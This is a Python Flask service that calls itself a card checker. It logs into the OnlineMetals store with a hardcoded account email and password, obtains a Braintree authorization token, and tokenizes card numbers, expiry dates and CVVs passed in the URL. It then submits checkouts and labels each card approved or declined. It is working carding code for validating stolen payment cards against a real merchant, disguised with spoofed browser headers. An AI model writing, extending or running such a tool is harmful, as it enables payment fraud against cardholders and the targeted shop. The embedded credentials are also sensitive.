"""
OnlineMetals card checker — Flask/Vercel API (headers complete)
GET /api/check?cc=4111111111111111|12|26|123
"""

from flask import Flask, request, jsonify
import requests
import re
import json
import base64
import random
import time
import os
from requests import Session

app = Flask(__name__)

TARGET      = "https://www.onlinemetals.com"
API_VERSION = "1.0.0"
UA          = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36")

LGN_EMAIL = "opdevildragon@gmail.com"
LGN_PASS  = "NsN8y"

# ── headers per hop (grafted from working set) ───────────────────
H_INDEX = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Accept-Encoding': "identity",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'upgrade-insecure-requests': "1",
    'sec-fetch-site': "none",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'accept-language': "en-IN,en;q=0.9",
}

H_LOGIN_GET = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Accept-Encoding': "identity",
    'upgrade-insecure-requests': "1",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': f"{TARGET}/",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=0, i",
}

H_LOGIN_POST = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Content-Type': "application/x-www-form-urlencoded",
    'cache-control': "max-age=0",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'upgrade-insecure-requests': "1",
    'origin': TARGET,
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': f"{TARGET}/account/login",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=0, i",
    'Accept-Encoding': "identity",
}

H_TOKEN_GET = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Accept-Encoding': "identity",
    'upgrade-insecure-requests': "1",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': f"{TARGET}/account",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=0, i",
}

H_TOKEN_AJAX = {
    'User-Agent': UA,
    'sec-ch-ua-platform': "\"Android\"",
    'x-requested-with': "XMLHttpRequest",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
    'sec-ch-ua-mobile': "?1",
    'origin': TARGET,
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': f"{TARGET}/account/payment-methods",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=1, i",
    'Accept-Encoding': "identity",
}

H_BT = {
    'User-Agent': UA,
    'Content-Type': "application/json",
    'Braintree-Version': "2018-05-10",
    'Origin': "https://assets.braintreegateway.com",
    'Referer': "https://assets.braintreegateway.com/",
    'Sec-Fetch-Site': "cross-site",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Accept-Language': "en-IN,en;q=0.9",
    'priority': "u=1, i",
    'Accept-Encoding': "identity",
}

H_CHECKOUT_GET = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Accept-Encoding': "identity",
    'upgrade-insecure-requests': "1",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': f"{TARGET}/cart",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=0, i",
}

H_CHECKOUT_POST = {
    'User-Agent': UA,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Content-Type': "application/x-www-form-urlencoded",
    'cache-control': "max-age=0",
    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
    'sec-ch-ua-mobile': "?1",
    'sec-ch-ua-platform': "\"Android\"",
    'upgrade-insecure-requests': "1",
    'origin': TARGET,
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': f"{TARGET}/checkout",
    'accept-language': "en-IN,en;q=0.9",
    'priority': "u=0, i",
    'Accept-Encoding': "identity",
}

# ── scrub urls/domains from any message ─────────────────────────
def scrub(msg: str) -> str:
    if not msg:
        return ""
    msg = re.sub(r'https?://\S+', '[redacted]', msg)
    msg = re.sub(r'\b(?:\w+\.)+(?:com|net|org|io|au|co|php)\b', '[redacted]', msg)
    return msg.strip()

# ── extract braintree auth ─────────────────────────────────────
def extract_auth(html: str):
    if not html:
        return None
    m = re.search(r'braintree\.dropin\.create\(\s*(\{.*?\})\s*\)', html, re.DOTALL)
    if m:
        try:
            j = json.loads(m.group(1))
            tok = j.get('authorization')
            if tok:
                dec = json.loads(base64.b64decode(tok).decode())
                if 'authorizationFingerprint' in dec:
                    return dec['authorizationFingerprint']
        except Exception:
            pass
    for m in re.findall(r'authorization:\s*"([^"]+)"', html):
        try:
            dec = json.loads(base64.b64decode(m).decode())
            if 'authorizationFingerprint' in dec:
                return dec['authorizationFingerprint']
        except Exception:
            continue
    for blob in re.findall(r'([A-Za-z0-9+/=]{200,})', html):
        try:
            dec = json.loads(base64.b64decode(blob).decode())
            if 'authorizationFingerprint' in dec:
                return dec['authorizationFingerprint']
        except Exception:
            continue
    return None

# ── grab client token via site ajax ────────────────────────────
def grab_token(s: Session):
    try:
        s.get(f"{TARGET}/", headers=H_INDEX, timeout=25)
        s.get(f"{TARGET}/account/login", headers=H_LOGIN_GET, timeout=25)
        s.post(f"{TARGET}/account/login", headers=H_LOGIN_POST,
               data={'email': LGN_EMAIL, 'password': LGN_PASS,
                     'action': 'login'}, timeout=25)

        for path in ("/account/payment-methods", "/account", "/checkout"):
            r = s.get(f"{TARGET}{path}", headers=H_TOKEN_GET, timeout=25)
            # try direct html token first
            tok = extract_auth(r.text)
            if tok:
                return tok
            # try site ajax endpoint for client token
            m = re.search(r'client_token_nonce["\s:]+"?([a-f0-9]{20,})"?', r.text)
            if m:
                nonce = m.group(1)
                aj = s.post(f"{TARGET}/wp-admin/admin-ajax.php",
                            headers=H_TOKEN_AJAX,
                            data={'action': 'wc_braintree_credit_card_get_client_token',
                                  'nonce': nonce}, timeout=25)
                try:
                    j = aj.json()
                    if j.get('success') and j.get('data'):
                        td = json.loads(base64.b64decode(j['data']).decode())
                        if 'authorizationFingerprint' in td:
                            return td['authorizationFingerprint']
                except Exception:
                    pass
    except Exception:
        pass
    return None

# ── tokenize card via braintree graphql ────────────────────────
def tokenize(s: Session, auth: str, cc, mm, yy, cvv):
    sid = ''.join(random.choices('abcdef0123456789', k=32))
    payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": sid},
        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                  "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"),
        "variables": {"input": {
            "creditCard": {"number": cc, "expirationMonth": mm,
                           "expirationYear": yy, "cvv": cvv},
            "options": {"validate": False}}},
        "operationName": "TokenizeCreditCard",
    }
    hdrs = dict(H_BT)
    hdrs['Authorization'] = f'Bearer {auth}'
    r = s.post("https://payments.braintree-api.com/graphql",
               json=payload, headers=hdrs, timeout=25)
    if r.status_code != 200:
        return None, "token_api_fail"
    j = r.json()
    if 'errors' in j:
        return None, scrub(str(j['errors']))
    try:
        return j['data']['tokenizeCreditCard']['token'], None
    except (KeyError, TypeError):
        return None, "bad_token_response"

# ── submit nonce → classify ────────────────────────────────────
def submit(s: Session, nonce: str):
    try:
        r = s.post(f"{TARGET}/checkout/complete", headers=H_CHECKOUT_POST,
                   data={'payment_method': 'braintree_credit_card',
                         'payment_nonce': nonce,
                         'accept_terms': '1'}, timeout=25)
        body = r.text.lower()
        if any(k in body for k in ('order received', 'order confirmed',
                                   'thank you', 'payment approved', 'success')):
            return {'status': 'approved', 'message': 'Auth Successfully'}
        if 'insufficient' in body:
            return {'status': 'approved', 'message': 'Insufficient Funds'}
        errs = re.findall(r'<li[^>]*>(.*?)</li>', r.text, re.DOTALL)
        for e in errs:
            txt = re.sub(r'<[^>]+>', '', e)
            if any(k in txt.lower() for k in
                   ('declin', 'incorrect', 'invalid', 'cvv', 'expired', 'fail')):
                return {'status': 'declined', 'message': scrub(txt)}
        m = re.search(r'(error|declin)[^<]*?:\s*([^<]+)', body)
        if m:
            return {'status': 'declined', 'message': scrub(m.group(2))}
        return {'status': 'declined', 'message': 'Card declined'}
    except Exception as e:
        return {'status': 'error', 'message': scrub(str(e))}

# ── routes ─────────────────────────────────────────────────────
@app.route('/', methods=['GET'])
def home():
    return jsonify({'status': 'active', 'gateway': 'OnlineMetals — Braintree',
                    'version': API_VERSION,
                    'endpoints': {'/api/check': 'GET ?cc=number|mm|yy|cvv',
                                  '/api/health': 'GET'}})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'ts': time.time()})

@app.route('/api/check', methods=['GET'])
def check():
    s = Session()
    try:
        raw = request.args.get('cc')
        if not raw:
            return jsonify({'status': 'error', 'message': 'missing cc param'}), 400
        parts = raw.strip().split('|')
        if len(parts) != 4:
            return jsonify({'status': 'error', 'message': 'use cc|mm|yy|cvv'}), 400
        cc, mm, yy, cvv = (p.strip() for p in parts)
        if not (cc.isdigit() and 15 <= len(cc) <= 16):
            return jsonify({'status': 'error', 'message': 'bad card number'}), 400
        if not (mm.isdigit() and 1 <= int(mm) <= 12):
            return jsonify({'status': 'error', 'message': 'bad month'}), 400
        if not (yy.isdigit() and len(yy) == 2):
            return jsonify({'status': 'error', 'message': 'bad year'}), 400
        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
            return jsonify({'status': 'error', 'message': 'bad cvv'}), 400

        auth = grab_token(s)
        if not auth:
            return jsonify({'status': 'error', 'message': 'no auth token'}), 200

        nonce, err = tokenize(s, auth, cc, mm, yy, cvv)
        if not nonce:
            return jsonify({'status': 'declined',
                            'message': scrub(err or 'tokenization failed'),
                            'bin': cc[:6], 'last4': cc[-4:]}), 200

        result = submit(s, nonce)
        result.update({'card': f"{cc[:6]}******{cc[-4:]}",
                       'bin': cc[:6], 'last4': cc[-4:]})
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': scrub(str(e))}), 500
    finally:
        s.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
